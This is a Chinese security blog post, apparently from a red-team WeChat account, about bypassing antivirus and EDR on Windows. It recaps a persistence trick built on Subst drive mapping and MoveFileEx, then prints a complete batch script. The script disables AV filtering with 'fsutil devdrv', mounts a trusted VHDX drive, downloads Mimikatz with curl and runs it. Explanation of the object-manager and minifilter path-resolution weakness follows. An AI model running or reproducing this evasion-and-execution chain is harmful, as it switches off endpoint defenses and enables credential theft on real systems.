---
title: 从 Subst 到 VHDX，一种设计上绕过杀软的代码执行、过启动项，权限维持方式
url: https://mp.weixin.qq.com/s/pfG-KR1GBfOln0XJK6HKSw
source: Doonsec's feed
date: 2026-09-23
fetch_date: 2026-09-24T06:57:51.438246
---

# 从 Subst 到 VHDX，一种设计上绕过杀软的代码执行、过启动项，权限维持方式

# 从 Subst 到 VHDX，一种设计上绕过杀软的代码执行、过启动项，权限维持方式

原创

老鑫安全
老鑫安全

老鑫安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

之前我们分享过一篇利用 `Subst` 驱动器映射 + `MoveFileEx` 延迟移动 + 自定义文件关联绕过 360启动项的文章

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GEVYW8ofHic3mToYib1kZACfkBHLsEGmpicTrow4xMsS8gXXO5oL8sK1WWjB5nr50msRb6gcD4TFUUsZZZJRGW67Gm04mLDYUHdtaiant5LBQ4o/640?wx_fmt=png&from=appmsg)

最近读《Windows Internals 7》看到**同一个底层原理的两种不同实现**

**旧文（Subst 方案）：**

1. 用 `Subst` 把启动目录映射成 `X:` 盘
2. 把恶意文件写入普通目录
3. 用 `MoveFileEx(..., MOVEFILE_DELAY_UNTIL_REBOOT)` 安排重启后移动到 `X:\Startup`
4. 注册自定义文件关联（如 `.nb` → `wscript.exe`）触发执行

**新文（VHDX 方案）：**

1. 用 `diskpart` 创建并挂载 VHDX 为 `B:` 盘
2. 用 `fsutil devdrv trust b:` 让杀软信任该卷
3. 把 Mimikatz 下载到 `B:` 盘并执行

```
@echo offsetlocal enabledelayedexpansiontitle Mimikatz VHDX Bypass POC
:: ==========================================:: 阶段 1: 禁用防御与准备环境:: ==========================================echo [*] Phase 1: Disabling defenses and preparing environment...
:: 尝试开启 DevDrv 功能并禁用杀软（视系统版本和权限而定）fsutil devdrv enablefsutil devdrv enable /disallowAv
:: 创建临时工作目录if not exist "c:\temp\mimi" md "c:\temp\mimi"cd /d "c:\temp\mimi"
:: 生成 diskpart 脚本，创建 10GB 可扩展 VHDX 虚拟磁盘echo create vdisk file="c:\temp\mimi\mimi.vhdx" maximum=10240 type=expandable > diskpart.txtecho select vdisk file="c:\temp\mimi\mimi.vhdx" >> diskpart.txtecho attach vdisk >> diskpart.txtecho create partition primary >> diskpart.txtecho assign letter=b >> diskpart.txtecho exit >> diskpart.txt
:: 执行 diskpart 挂载虚拟磁盘echo [*] Creating and attaching VHDX as Drive B:...diskpart /s "c:\temp\mimi\diskpart.txt"
:: 格式化 B 盘echo [*] Formatting Drive B:...format b: /devdrv /q /y
:: ==========================================:: 阶段 2: 绕过检测 (AV Evasion):: ==========================================echo [*] Phase 2: Bypassing AV filters on Drive B:...
:: 清除针对 B 盘的过滤器并信任该卷fsutil devdrv clearFiltersAllowed b:fsutil devdrv trust b:fsutil devdrv query b:
:: ==========================================:: 阶段 3: 下载与执行 Payload:: ==========================================echo [*] Phase 3: Downloading and executing Mimikatz...
:: 用Mimikatz 测试set "MIMI_URL=https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
:: 下载到受信任的 B 盘echo [*] Downloading Mimikatz to B:\mimi.zip...curl -L "%MIMI_URL%" -o b:\mimi.zip
:: 切换到 B 盘并解压b:echo [*] Extracting...tar -xf b:\mimi.zip
:: 进入 x64 目录并执行 Mimikatzcd x64echo [*] Launching Mimikatz...mimikatz.exe
:: 脚本结束，保持窗口打开以便观察echo.echo [*] POC Execution Finished.pause
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GEVYW8ofHic1icqay6AvQ38ucuvLjzyRfdZdsLKDYxWLOSjDmTWI5vBQ0IlIiasL62X86AhPZpWSzeCRKhAwnCleibkF8xqcicuKKSYBzzoAhrM0/640?wx_fmt=jpeg&from=appmsg)

《Windows Internals 7》不仅是一本参考书，更是红蓝对抗的“兵法”。理解内核对象、符号链接、IRP 处理流程和启动阶段，能帮助防守方看清攻击者的真实意图，也能帮助红队找到更隐蔽的突破口。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GEVYW8ofHic22Ty2HUpp3hPn4Q81gYjYWVibyQfZXzOWSrubvuzibmpsBJjdVCazgbuDUpPhYAqRfG2LPWib2KPPoevOXtAiawLfInIgzYT7GCgk/640?wx_fmt=png&from=appmsg)

**攻防之路，始于底层，成于细节。**

****攻击者的每一个“奇技淫巧”，背后都是对 Windows 底层机制的深刻理解。**
**防守者的每一次进化，也都离不开对内核的敬畏****

**答案在第 10 章“文件系统”和第 3 章“对象管理器”中**

### 核心概念：符号链接（Symbolic Link）与卷挂载

Windows 对象管理器用 **符号链接** 来管理设备命名空间。我们平时看到的 `C:\`、`D:\` 其实都是符号链接，指向真正的卷设备对象（如 `\Device\HarddiskVolume3`）。

* **`Subst` 做的事**：创建一个 DOS Device 符号链接，把 `\??\X:` 指向 `\??\C:\SomeFolder`。它**没有创建新的卷**，只是在路径解析层面做了一个“跳转”。
* **VHDX 挂载做的事**：创建一个新的卷设备对象（`\Device\HarddiskVolumeN`），然后创建一个符号链接 `\??\B:` 指向它。它**创建了一个真实的卷**。

**共同点：两者都在对象管理器的命名空间中“插入”了一个新的路径入口。**

### EDR 为什么会被绕过？

EDR 的文件监控通常依赖 **Minifilter 驱动**，挂在 `FltMgr` 上，通过 `IRP_MJ_CREATE`、`IRP_MJ_WRITE` 等回调获取文件操作。

这里的关键在于 **路径解析的时机**：

* 当进程访问 `X:\test.nb` 时，I/O 管理器需要把 `X:` 解析成真实的设备路径。这个解析过程发生在 **IRP 下发之前**。
* Minifilter 在回调中拿到的 `FileObject->FileName` 或 `FileObject->RelatedFileObject`，**可能是解析后的真实路径，也可能是解析前的路径**，取决于 EDR 的实现和挂载点位置。
* 如果 EDR 只监控 `C:\Users\...\Startup` 这个**字面路径**，而攻击者通过 `X:\Startup` 访问，EDR 可能根本不会触发告警。

**一句话总结：EDR 监控的是“路径字符串”，而 Windows 内核操作的是“设备对象”。两者之间的映射关系，就是攻击者的操作空间。**

| 特性 | VHDX + `fsutil devdrv` | `Subst` + `MoveFileEx` |
| --- | --- | --- |
| **核心机制** | 创建虚拟磁盘文件，挂载为独立卷 | 将本地文件夹映射为虚拟驱动器号 |
| **信任机制** | `fsutil devdrv trust b:` | 修改注册表 `DOS Devices` 实现持久化 |
| **落地方式** | 直接写入 B 盘并执行 | 写入映射目录，利用 `MoveFileEx` 延迟移动 |
| **EDR 视野** | 文件写入受信任卷 | 文件被“移动”到 Z:\ 盘 |

两者都是利用 Windows 对象管理器（Object Manager）中 **符号链接（Symbolic Link）** 的特性，让 EDR 的文件过滤驱动在路径解析上产生“错觉”。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/bkcWdoIicx2ceUKiaEJfG0L5ZJtpCjuISeOmHuvZZbpibNciacvzGib2W6jibSJPwQnuibB9SIic18Eiafy2LZicYLiarnFtA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过